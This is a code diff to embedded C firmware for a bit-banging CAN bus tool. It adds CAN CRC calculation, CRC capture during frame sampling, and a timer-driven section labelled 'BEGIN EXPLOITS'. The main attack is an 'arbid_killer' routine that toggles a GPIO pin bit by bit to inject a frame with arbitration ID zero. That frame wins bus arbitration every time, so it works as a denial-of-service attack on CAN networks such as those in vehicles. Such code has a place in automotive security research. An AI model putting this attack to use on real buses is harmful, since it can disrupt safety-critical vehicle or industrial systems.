@@ -10,7 +10,9 @@
 #include "usart.h"
 
 void (*timer4_callback_handler)(void) = NULL;
+void (*timer3_callback_handler)(void) = NULL;
 static void sync_callback(void);
+static void arbid_killer(void);
 
 static uint32_t can_baud = 500000;
 static uint32_t can_ticks_per_cycle;
@@ -22,6 +24,7 @@ static volatile uint16_t bits_read = 0;
 static volatile uint8_t last_bit = 0;
 static volatile uint8_t same_bits_count = 0;
 static volatile uint32_t arbid;
+static volatile uint32_t can_rx_crc;
 volatile uint32_t attack_arbid = 0;
 static volatile uint16_t msg_byte = 0;
 static volatile uint8_t message[8];
@@ -32,9 +35,47 @@ static volatile uint32_t frames_seen = 0;
 
 static volatile uint8_t synchronized = 0;
 
+static volatile uint8_t tx_bit_count = 0;
+
 const uint32_t TIMER_PERIOD_NS = 50;
 
-/* Start initializing the CAN peripheral */
+/*
+ * CAN CRC functions
+ */ 
+inline uint16_t crc_next_bit(uint16_t crc_rg, uint8_t bit)
+{
+    uint8_t crcnxt = bit ^ ((crc_rg >> 14) & 0x1);
+    crc_rg <<= 1;
+
+    if(crcnxt > 0)
+        crc_rg ^= 0x4599;
+    return crc_rg;
+}
+
+uint16_t can_crc(uint32_t arbid, uint8_t cntrl, uint8_t size, uint8_t data[])
+{
+    uint16_t crc_rg = 0;
+
+    for(int i = 11; i >= 0; i--)
+        crc_rg = crc_next_bit(crc_rg, ((arbid >> i) & 0x1));
+    for(int i = 2; i >= 0; i--)
+        crc_rg = crc_next_bit(crc_rg, ((cntrl >> i) & 0x1));
+    for(int i = 3; i >= 0; i--)
+        crc_rg = crc_next_bit(crc_rg, ((size >> i) & 0x1));
+    for(int i = 0; i < size; i++)
+        for(int j = 7; j >= 0; j--)
+            crc_rg = crc_next_bit(crc_rg, ((data[i] >> j) & 0x1));
+
+    return crc_rg & 0x7FFF;
+}
+
+
+/* Start initializing the CAN peripheral 
+ * 
+ * The CAN bus is sampled using the timer 4 interrupt, which fires in the middle of the bit
+ *
+ * The timer 3 interrupt fires at the start of each CAN bit, and is used for the attacks
+ */
 void can_init()
 {
     /* Enable TIM4 and TIM3 clock */
@@ -74,6 +115,7 @@ void can_poll()
         frame_done = 0;
         //printf("Arbid: %lx\r\n", arbid);
         //printf("Msg: %x %x %x %x %x %x %x %x\r\n", message[0], message[1], message[2], message[3], message[4], message[5], message[6], message[7]);
+        //printf("CRC: %lx\r\n", can_rx_crc);
         /* After 128 frames, turn the LED on */
         if ((frames_seen & 0x000000FF) == 128)
         {
@@ -189,6 +231,11 @@ static void sample_callback(void)
                 if(bits_read - 20 - (msg_byte * 8) >= 7)
                     msg_byte++;
             }
+            else if(bits_read >= (20 + (8 * msg_len)) && bits_read < (35 + (8 * msg_len)))
+            {
+                can_rx_crc <<= 1;
+                can_rx_crc |= bit_read;
+            }
         }
         else if (bits_read > 14)
         {
@@ -212,12 +259,17 @@ static void sample_callback(void)
                 if(bits_read - 40 - (msg_byte * 8) >= 7)
                     msg_byte++;
             }
-         }
+            else if(bits_read >= (40 + (8 * msg_len)) && bits_read < (55 + (8 * msg_len)))
+            {
+                can_rx_crc <<= 1;
+                can_rx_crc |= bit_read;
+            }
+        }
     }
     /* Currently skipping the last 18 bits of CRC and ACKS */
 
-    if((extended_arbid == 0 && bits_read > (20 + 18 + (8 * msg_len))) ||
-       (extended_arbid == 1 && bits_read > (40 + 18 + (8 * msg_len))))
+    if((extended_arbid == 0 && bits_read >= (20 + 18 + (8 * msg_len))) ||
+       (extended_arbid == 1 && bits_read >= (40 + 18 + (8 * msg_len))))
     {
         can_timer_stop();
         // Enable the external interrupt on the RX pin
@@ -250,6 +302,8 @@ void TIM3_IRQHandler(void)
 GPIOA->ODR |= GPIO_PIN_5;
     TIM3->SR = ~TIM_IT_UPDATE;
     TIM3->ARR = can_ticks_per_cycle;
+    if(timer3_callback_handler != NULL)
+        timer3_callback_handler();
 GPIOA->ODR &= ~GPIO_PIN_5;
 }
 
@@ -276,22 +330,27 @@ GPIOA->ODR |= GPIO_PIN_4;
     TIM4->CNT = 0;
 
     timer4_callback_handler = sample_callback;
-    same_bits_count = 0;
+    same_bits_count = 1;
     bits_read = 1;
     last_bit = 0;
     arbid = 0;
+    can_rx_crc = 0;
     msg_byte = 0;
     extended_arbid = 0;
     msg_len = 0;
+    tx_bit_count = 0;
 
     TIM4->DIER |= TIM_IT_UPDATE;
     TIM4->CR1 |= TIM_CR1_CEN;
 
-    /* Start the timer that fires on each CAN edge */
-    TIM3->ARR = can_ticks_per_cycle - can_edge_interrupt_delay;
-    TIM3->CNT = 0;
-    TIM3->DIER |= TIM_IT_UPDATE;
-    TIM3->CR1 |= TIM_CR1_CEN;
+    /* Start the timer that fires on each CAN edge if an attack is configured */
+    if(timer3_callback_handler != NULL)
+    {
+        TIM3->ARR = can_ticks_per_cycle - can_edge_interrupt_delay;
+        TIM3->CNT = 0;
+        TIM3->DIER |= TIM_IT_UPDATE;
+        TIM3->CR1 |= TIM_CR1_CEN;
+    }
 
     /* Set the ARR back to the correct value */
 GPIOA->ODR &= ~GPIO_PIN_4;
@@ -311,3 +370,67 @@ void setCanBaudrate(long int baud)
     can_edge_interrupt_delay = 450 / TIMER_PERIOD_NS;
 }
 
+/**
+ *
+ * BEGIN EXPLOITS
+ *
+ */
+void remove_attack()
+{
+    timer3_callback_handler = NULL;
+}
+
+static void arbid_killer()
+{
+    if(tx_bit_count <= 3) // First 4 zeros of arbid
+        GPIOB->ODR &= ~GPIO_PIN_13;
+    else if(tx_bit_count == 4) // First stuff bit
+        GPIOB->ODR |= GPIO_PIN_13;
+    else if(tx_bit_count <= 9) // Next 5 zeros of arbid
+        GPIOB->ODR &= ~GPIO_PIN_13;
+    else if(tx_bit_count == 10) // Stuff bit
+        GPIOB->ODR |= GPIO_PIN_13;
+    else if(tx_bit_count <= 15) // Last two zeros of arbid, no RTR, 11 bit id, and 0 reserved bit
+        GPIOB->ODR &= ~GPIO_PIN_13;
+    else if(tx_bit_count == 16) // Stuff bit
+        GPIOB->ODR |= GPIO_PIN_13;
+    else if(tx_bit_count <= 19) // First 3 bits of length
+        GPIOB->ODR &= ~GPIO_PIN_13;
+    else if(tx_bit_count == 20) // Sending one byte
+        GPIOB->ODR |= GPIO_PIN_13;
+    else if(tx_bit_count == 21) // First data bit
+        GPIOB->ODR &= ~GPIO_PIN_13;
+    else if(tx_bit_count == 22) // Second data bit
+        GPIOB->ODR |= GPIO_PIN_13;
+    else if(tx_bit_count <= 26) // 3-6 data bit
+        GPIOB->ODR &= ~GPIO_PIN_13;
+    else if(tx_bit_count <= 28) // 7th and 8th data bit
+        GPIOB->ODR |= GPIO_PIN_13;
+    else if(tx_bit_count == 29) // CRC is 0x3cd1
+        GPIOB->ODR &= ~GPIO_PIN_13;
+    else if(tx_bit_count <= 33)
+        GPIOB->ODR |= GPIO_PIN_13;
+    else if(tx_bit_count <= 35) 
+        GPIOB->ODR &= ~GPIO_PIN_13;
+    else if(tx_bit_count <= 37)
+        GPIOB->ODR |= GPIO_PIN_13;
+    else if(tx_bit_count == 38) 
+        GPIOB->ODR &= ~GPIO_PIN_13;
+    else if(tx_bit_count == 39)
+        GPIOB->ODR |= GPIO_PIN_13;
+    else if(tx_bit_count <= 42) 
+        GPIOB->ODR &= ~GPIO_PIN_13;
+    else if(tx_bit_count <= 44)
+        GPIOB->ODR |= GPIO_PIN_13;
+    else if(tx_bit_count == 45) 
+        GPIOB->ODR &= ~GPIO_PIN_13;
+    else if(tx_bit_count == 46)
+        GPIOB->ODR |= GPIO_PIN_13;
+
+    tx_bit_count++;
+}
+
+void install_arbid_killer()
+{
+    timer3_callback_handler = arbid_killer;
+}
